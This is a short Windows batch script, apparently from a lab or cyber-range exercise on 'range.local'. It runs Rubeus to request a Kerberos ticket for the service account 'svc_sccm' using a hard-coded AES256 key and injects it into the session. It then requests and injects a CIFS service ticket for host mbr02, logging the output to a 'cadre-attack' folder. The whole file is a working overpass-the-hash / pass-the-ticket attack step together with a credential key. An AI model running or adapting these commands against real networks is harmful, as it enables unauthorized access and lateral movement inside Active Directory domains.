@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /ptt >nul 2>&1
echo === ASKTGS cifs/mbr02.range.local (full output) ===
Rubeus.exe asktgs /service:cifs/mbr02.range.local /ptt > C:\Tools\cadre-attack\tgs1.txt 2>&1
type C:\Tools\cadre-attack\tgs1.txt
